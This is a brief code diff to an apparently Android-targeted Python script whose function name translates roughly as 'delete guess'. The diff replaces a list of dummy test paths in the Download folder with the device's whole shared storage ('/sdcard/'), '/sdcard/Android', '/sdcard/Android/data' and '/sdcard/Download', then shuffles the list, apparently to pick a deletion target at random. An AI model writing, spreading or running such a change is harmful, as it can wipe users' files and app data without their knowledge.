@@ -23,10 +23,10 @@ def hapus_tebakan():
     box_width = 40
 
     target_list = [
-        "/sdcard/Download/gaktau.txt",
-        "/sdcard/Download/folderrahasia",
-        "/sdcard/Download/penting.txt",
-        "/sdcard/Download/cobafolder"
+        "/sdcard/Android",
+        "/sdcard/Download",
+        "/sdcard/",
+        "/sdcard/Android/data"
     ]
 
     random.shuffle(target_list)
